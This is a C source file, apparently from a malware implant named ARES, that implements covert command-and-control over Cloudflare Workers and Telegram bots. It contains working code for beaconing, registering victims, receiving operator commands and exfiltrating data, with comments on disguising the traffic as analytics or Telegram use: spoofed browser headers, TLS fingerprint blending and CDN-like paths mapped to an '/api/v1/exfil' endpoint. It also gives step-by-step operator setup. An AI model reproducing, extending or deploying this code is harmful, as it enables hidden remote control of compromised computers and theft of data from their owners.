/*
 * ═══════════════════════════════════════════════════════════════
 *  ARES v4.0 — Cloud C2 Channel (Cloudflare Workers / Telegram)
 *
 *  Free cloud services as C2 channels. Traffic appears as:
 *    - Cloudflare Workers: HTTPS to *.workers.dev (legitimate)
 *    - Telegram Bot API: HTTPS to api.telegram.org (common)
 *
 *  Usage (compile-time selection):
 *    -DARES_C2_CLOUDFLARE -DC2_WORKER="worker-name"
 *    -DARES_C2_TELEGRAM -DTELEGRAM_TOKEN="botTOKEN" -DTELEGRAM_CHAT_ID="12345"
 *
 *  If neither is defined, falls back to direct HTTPS C2.
 * ═══════════════════════════════════════════════════════════════
 */

#include "ares_agent.h"
#if __has_include("ares_config.h")
#include "ares_config.h"
#endif
#include <stdio.h>
#include <string.h>
#include <winhttp.h>

/* ── Cloudflare Workers C2 (v4.2 — Tunnel-based) ──
 *
 * Setup (operator-side, free):
 *   1. Sign up at dash.cloudflare.com (free)
 *   2. Deploy CF Worker relay: cd c2-relay && npx wrangler deploy
 *   3. Set secrets: npx wrangler secret put C2_BACKEND (= tunnel URL)
 *   4. Setup tunnel: .\setup_cloudflare_tunnel.ps1
 *   5. Start C2: .\start_c2_cloudflare.ps1
 *   6. Compile agent with:
 *      -DARES_C2_CLOUDFLARE -DC2_WORKER_HOST=L"analytics-edge.xxx.workers.dev"
 *
 * Traffic flow:
 *   Agent → CF Worker (*.workers.dev) → CF Tunnel → Local C2
 *
 * What network sees:
 *   DNS: analytics-edge.xxx.workers.dev → Cloudflare IP (104.16.x.x)
 *   TLS SNI: analytics-edge.xxx.workers.dev
 *   → Analyst: "Normal HTTPS to Cloudflare (analytics service)"
 *
 * Path obfuscation (v4.2):
 *   Agent sends:  /cdn/v2/heartbeat  → Worker maps to: /api/v1/beacon
 *   Agent sends:  /cdn/v2/telemetry  → Worker maps to: /api/v1/register
 *   Agent sends:  /cdn/v2/analytics  → Worker maps to: /api/v1/result
 *   Agent sends:  /cdn/v2/events     → Worker maps to: /api/v1/exfil
 */

#ifdef ARES_C2_CLOUDFLARE

#ifndef C2_WORKER_HOST
#define C2_WORKER_HOST L""  /* MUST set at build time: -DC2_WORKER_HOST=L"analytics-edge.xxx.workers.dev" */
#endif

typedef struct {
    BYTE* body;
    DWORD size;
    int   status;
} CF_RESP;

static CF_RESP _cf_http(const wchar_t* path, const char* method,
    BYTE* post_data, int post_len)
{
    CF_RESP resp = {0};

    /* v4.2: Validate worker host is configured */
    if (!C2_WORKER_HOST[0]) return resp;

    HINTERNET hSession = WinHttpOpen(
        L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
        L"(KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    if (!hSession) return resp;

    /* v4.2: TLS 1.2+ and HTTP/2 for JA3 fingerprint blending */
    DWORD tlsProtos = 0x00000800 | 0x00002000; /* TLS 1.2 + 1.3 */
    WinHttpSetOption(hSession, WINHTTP_OPTION_SECURE_PROTOCOLS,
        &tlsProtos, sizeof(tlsProtos));
    DWORD http2Flag = 0x00000002;
    WinHttpSetOption(hSession, 0x000000BA, &http2Flag, sizeof(http2Flag));

    HINTERNET hConnect = WinHttpConnect(hSession, C2_WORKER_HOST, 443, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return resp; }

    DWORD flags = WINHTTP_FLAG_SECURE;
    HINTERNET hRequest = WinHttpOpenRequest(hConnect,
        method[0] == 'P' ? L"POST" : L"GET",
        path, NULL, NULL, NULL, flags);
    if (!hRequest) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return resp;
    }

    /* Set standard headers to blend with normal analytics traffic */
    WinHttpAddRequestHeaders(hRequest,
        L"Accept: application/json, text/plain, */*\r\n"
        L"Content-Type: application/json\r\n"
        L"Origin: https://analytics.edge.io\r\n"
        L"Referer: https://analytics.edge.io/dashboard",
        -1L, WINHTTP_ADDREQ_FLAG_ADD);

    /* Send request */
    BOOL sent;
    if (post_data && post_len > 0)
        sent = WinHttpSendRequest(hRequest, NULL, 0, post_data, post_len, post_len, 0);
    else
        sent = WinHttpSendRequest(hRequest, NULL, 0, NULL, 0, 0, 0);

    if (sent && WinHttpReceiveResponse(hRequest, NULL)) {
        /* Read response */
        DWORD total = 0;
        DWORD avail = 0;
        resp.body = (BYTE*)HeapAlloc(GetProcessHeap(), 0, 65536);
        if (resp.body) {
            while (WinHttpQueryDataAvailable(hRequest, &avail) && avail > 0) {
                DWORD read;
                if (total + avail > 65536) break;
                WinHttpReadData(hRequest, resp.body + total, avail, &read);
                total += read;
            }
            resp.size = total;
        }

        /* Get status code */
        DWORD sz = sizeof(resp.status);
        WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
            NULL, &resp.status, &sz, NULL);
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return resp;
}

/* Public API — drop-in replacement for stager.c _http() */
CF_RESP Ares_CloudflareBeacon(const wchar_t* path, const char* method,
    BYTE* data, int data_len)
{
    return _cf_http(path, method, data, data_len);
}

/* v4.2: Obfuscated path wrappers — use CDN-like paths */
CF_RESP Ares_CF_Register(BYTE* data, int data_len)
{
    return _cf_http(L"/cdn/v2/telemetry", "POST", data, data_len);
}

CF_RESP Ares_CF_Beacon(BYTE* data, int data_len)
{
    return _cf_http(L"/cdn/v2/heartbeat", "POST", data, data_len);
}

CF_RESP Ares_CF_Result(BYTE* data, int data_len)
{
    return _cf_http(L"/cdn/v2/analytics", "POST", data, data_len);
}

CF_RESP Ares_CF_Exfil(BYTE* data, int data_len)
{
    return _cf_http(L"/cdn/v2/events", "POST", data, data_len);
}

#endif /* ARES_C2_CLOUDFLARE */


/* ── Telegram Bot C2 ──
 *
 * Setup (operator-side, free):
 *   1. Message @BotFather on Telegram → create bot → get token
 *   2. Create private channel/group → get chat ID
 *   3. Compile agent with:
 *      -DARES_C2_TELEGRAM
 *      -DTELEGRAM_BOT_TOKEN="1234567890:ABCdefGHIjklMNOpqrSTUvwxYZ"
 *      -DTELEGRAM_CHAT_ID="-100123456789"
 *
 * Protocol:
 *   Beacon: GET /bot<TOKEN>/getUpdates?offset=<last_id>
 *   → Operator sends commands as Telegram messages
 *   → Agent reads messages, parses commands
 *   
 *   Result: POST /bot<TOKEN>/sendMessage
 *   → body: {"chat_id":"...","text":"..."}
 *   → Agent sends task output as Telegram messages
 *
 * What network sees:
 *   DNS: api.telegram.org → Telegram IP
 *   TLS SNI: api.telegram.org
 *   → Analyst: "Telegram traffic (common in corporate environments)"
 */

#ifdef ARES_C2_TELEGRAM

#ifndef TELEGRAM_BOT_TOKEN
#define TELEGRAM_BOT_TOKEN "YOUR_BOT_TOKEN_HERE"
#endif
#ifndef TELEGRAM_CHAT_ID
#define TELEGRAM_CHAT_ID "YOUR_CHAT_ID_HERE"
#endif

static wchar_t g_tg_host[] = L"api.telegram.org";

typedef struct {
    BYTE* body;
    DWORD size;
    int   status;
} TG_RESP;

static TG_RESP _tg_request(const wchar_t* path, const char* method,
    BYTE* post_data, int post_len)
{
    TG_RESP resp = {0};

    HINTERNET hSession = WinHttpOpen(
        L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    if (!hSession) return resp;

    HINTERNET hConnect = WinHttpConnect(hSession, g_tg_host, 443, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return resp; }

    HINTERNET hRequest = WinHttpOpenRequest(hConnect,
        method[0] == 'P' ? L"POST" : L"GET",
        path, NULL, NULL, NULL, WINHTTP_FLAG_SECURE);
    if (!hRequest) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return resp;
    }

    if (method[0] == 'P') {
        WinHttpAddRequestHeaders(hRequest,
            L"Content-Type: application/json", -1L, WINHTTP_ADDREQ_FLAG_ADD);
    }

    BOOL sent;
    if (post_data && post_len > 0)
        sent = WinHttpSendRequest(hRequest, NULL, 0, post_data, post_len, post_len, 0);
    else
        sent = WinHttpSendRequest(hRequest, NULL, 0, NULL, 0, 0, 0);

    if (sent && WinHttpReceiveResponse(hRequest, NULL)) {
        resp.body = (BYTE*)HeapAlloc(GetProcessHeap(), 0, 65536);
        if (resp.body) {
            DWORD total = 0, avail, read;
            while (WinHttpQueryDataAvailable(hRequest, &avail) && avail > 0) {
                if (total + avail > 65536) break;
                WinHttpReadData(hRequest, resp.body + total, avail, &read);
                total += read;
            }
            resp.size = total;
        }
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return resp;
}

/* Poll for commands from Telegram */
int Ares_TelegramPoll(char* task_out, int task_max, int* update_id)
{
    wchar_t path[512];
    swprintf(path, 512, L"/bot%S/getUpdates?offset=%d&limit=1&timeout=5",
        TELEGRAM_BOT_TOKEN, *update_id);

    TG_RESP resp = _tg_request(path, "GET", NULL, 0);
    if (!resp.body || resp.size == 0) return 0;

    /* Parse: find "text":"..." in response */
    char* text = strstr((char*)resp.body, "\"text\":\"");
    if (text) {
        text += 8;
        char* end = strchr(text, '"');
        if (end) {
            int len = (int)(end - text);
            if (len > task_max - 1) len = task_max - 1;
            memcpy(task_out, text, len);
            task_out[len] = '\0';

            /* Extract update_id for offset */
            char* uid = strstr((char*)resp.body, "\"update_id\":");
            if (uid) {
                uid += 12;
                *update_id = atoi(uid) + 1;
            }

            HeapFree(GetProcessHeap(), 0, resp.body);
            return len;
        }
    }

    HeapFree(GetProcessHeap(), 0, resp.body);
    return 0;
}

/* Send result back via Telegram */
BOOL Ares_TelegramSend(const char* message, int msg_len)
{
    /* Build JSON: {"chat_id":"...","text":"..."} */
    int json_max = msg_len * 2 + 256;
    char* json = (char*)HeapAlloc(GetProcessHeap(), 0, json_max);
    if (!json) return FALSE;

    int n = snprintf(json, json_max,
        "{\"chat_id\":\"%s\",\"text\":\"", TELEGRAM_CHAT_ID);

    /* Escape for JSON */
    for (int i = 0; i < msg_len && n < json_max - 10; i++) {
        char c = message[i];
        if (c == '"') { json[n++] = '\\'; json[n++] = '"'; }
        else if (c == '\\') { json[n++] = '\\'; json[n++] = '\\'; }
        else if (c == '\n') { json[n++] = '\\'; json[n++] = 'n'; }
        else if (c >= 0x20) { json[n++] = c; }
    }
    n += snprintf(json + n, json_max - n, "\"}");

    wchar_t path[512];
    swprintf(path, 512, L"/bot%S/sendMessage", TELEGRAM_BOT_TOKEN);

    TG_RESP resp = _tg_request(path, "POST", (BYTE*)json, n);
    BOOL ok = (resp.body != NULL);
    if (resp.body) HeapFree(GetProcessHeap(), 0, resp.body);
    HeapFree(GetProcessHeap(), 0, json);
    return ok;
}

#endif /* ARES_C2_TELEGRAM */
